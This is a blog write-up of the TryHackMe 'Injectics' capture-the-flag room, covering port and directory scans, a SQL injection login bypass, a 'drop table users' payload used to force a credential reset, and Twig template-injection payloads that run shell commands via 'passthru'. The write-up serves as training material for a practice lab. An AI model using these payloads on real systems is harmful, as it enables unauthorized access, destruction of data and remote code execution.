---
layout: post
title: TryHackMe - Injectics (Writeup)
date: 2024-12-22 22:46 -0300
tags: ["thm","writeup","sqli","ssti"]
---

In this occasion we will be solving TryHackMe's room Injectics.
URL: https://tryhackme.com/r/room/injectics

## Recon

First start with checking which ports we have opened for the challenge. We can see we will be working with 22, and 80 ports. So next we have to check which services are running on those ports.

```bash
sudo rustscan -a 10.10.81.229 --tries 2 --ulimit 5000 -g -- --no-nmap

10.10.81.229 -> [22,80]
```

### Service Scanning

```
Host is up, received user-set (0.35s latency).
Scanned at 2024-12-24 18:10:01 -03 for 19s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2e:90:a8:27:f5:fc:a3:34:9f:72:5c:0a:cc:98:c1:21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0yMnR7iVIXU3q78+JruJ40IQ5tKT18S+9J1scCjWzcc9MtVIkFjFFHIK+KxOntnPLHMajNtalOxxAgxfp05orKJiIzG+FW5GJrwmB4aDynbKI16ssQVGJeeuQHeVVqPst2Q1we4TmbYXVGm/v/eiM57E50sG/Z3N828+rzbOUDMiYNvmCxdK55Q+khSz/f2GDIdSUvqua8P8D/cHl5Zy8o0jrBRU9HgRYjVW9ZcyleSo7Qkshk/1y19zKySHacS+L/sO7VcI8WCX6RNiqEL99ScSkx7SbGmIQYedwkWD5Q1MzgblLtgrxmw3h1knrVp4aNmrZKaDWrRUw8q1jmDjxfoljzb4ZqvuUUzxb5M0J23yvgC+Q7ZiNjSufix8s2tSEujPzWC9+vKDwWrFspvzxqYjPgu6qSEqswdCSqoN/XiWlL/EyWe5bGwmfX3yYOBBAOxjIHrhVm4LZGM9rfTdJPxTwA/7AxmNwcdMOF1qlncszArjrn2fh8aZSLK3f5Is=
|   256 cd:5e:f1:f9:bc:ff:22:1c:bc:e1:c6:56:bd:42:33:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPdglr8BgdVRYGU9MXcy/3c1Wh5vF4CT74x0epmCvjmY7LR4/GYgAvjEL6kMPljV8Bcr4GLofZ0qn35zIFeQkrE=
|   256 3c:76:34:32:f5:4d:55:ff:2a:65:62:58:5d:22:e8:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINleeQnKzik4JtmSBpmToZFEUs0VxjABsunoije3zK6f
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Injectics Leaderboard
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We can see we have a PHP website with a Leaderboard and a login function.

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224181348.png)

We can make a curl request to check the frontend website code. After inspecting this a bit we get a mail.log (path) and a username (dev@injectics.thm)

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224181612.png)

Afterwards, we can inspect /mail.log path and we get more information related to the system. Which says basically that there is a monitor program that checks if something has been modified on the database. If so, the program proceeds to reset itself and set default creds. (Weird implementation e.e), but then we can write down the default creds we will be using later.

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224181705.png)

### Directory enumeration 
Now, proceed to do some dir/file enumeration, in this time I'll be using ffuf as follows.

```bash
ffuf -u http://10.10.81.229/FUZZ -w /media/c/slow-1tb/wordlists/custom_wordlists/wr41th_web_filtered.txt -t 60 -mc 200
```

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224182455.png)

We can see some interesting files here:

composer.json 

Shows twig: 2.14.0 version *twig is a template generation engine for php* this is a little clue about what we will require to do after.

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224182651.png)

phpmyadmin

The database used by the application is MySQL server

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224182751.png)

script.js

This script shows that they tried to filter out some special chars and words to prevent SQLinjections. we cannot use them on the frontend. But is there anything on the backend? ;)

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224182844.png)

# Exploitation

So we proceed to intercept the login function on the webpage as follows.

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224183347.png)

And load sqli.auth.bypass wordlist from seclists.

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224183647.png)

Before launching the attack always check the values of the wordlist you're using here. We can see here that many values started with root or admin (words that we need to delete before the attack).

So add a couple of Match and replace rules to replace admin and root values with an empty string, and inject the payloads after the user email we gathered previously. (dev@injectics.thm).

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224183633.png)

After launching the attack we can see that some request made a different Length response size, so let's see the results.

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224183746.png)

This payload has bypassed the login page. :D `'#`

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224184220.png)

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224183809.png)

Reload the website and we can see we got access as dev. Now let's inspect this edit Leader board functionality.

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224184335.png)

As we have no input sanitization here, we can inject our payloads directly on this interface, using this payload `;drop table users-- -` will erase of the users of the table and trigger the monitoring program to set default credentials on both users.

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224184727.png)

It worked, and now wait 2 minutes and reload the main site and go to the admin login page.

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224184748.png)

Use the superadmin default credentials and login into the admin panel.

```
Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

```



![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224185047.png)

Here you can see the first flag :D.

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224185122.png)

Now, notice we have a new tab called profile, let's inspect it. We can see a input name field that is reflected on the main page. So with this and and using the info from the `composer.json` > `twig: 2.14.0` let's try some SSTI (Server Site Template Injection).

I've used this resource.
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

Injecting a basic PoC to verify code execution 
```php
{% raw %}
{{5*8}}
{% endraw %}
```

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224185349.png)

We can see in the main page that the results of the operation has been processed.

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224185438.png)

Then, try the following payload and confirm Remote Code Execution.

```php
{% raw %}
{{['id',""]|sort('passthru')}}
{% endraw %}
```

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224185835.png)

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224185801.png)

Next, change the payload to list the webserver's files.

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224190143.png)

I used `ctrl-u` to get a better view of the webpage code.

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224190000.png)

Next, inspect the flag directory to see the filename of the flag file.

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224190246.png)

**Final payload**

Finally, use the following payload to get the flag value.

```php
{% raw %}
{{['cat ./flags/<REDACTED>.txt',""]|sort('passthru')}}
{% endraw %}
```

![](/assets/img/posts/2024-12-22-tryhackme-injectics-writeup/20241224190356.png)

## Summary

This room included some interesting vulnerabilities, first bypassing a login page using SQLinjection bypass techniques, using a second order SQLinjection to get access to the admin panel, and finally using a Server Side Template Injection vulnerability in Twig template engine to achieve Remote Code Execution. I hope you like this writeup and. hack the planet!

{% raw %}
<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=67379" style="border:none;"></iframe>
{% endraw %}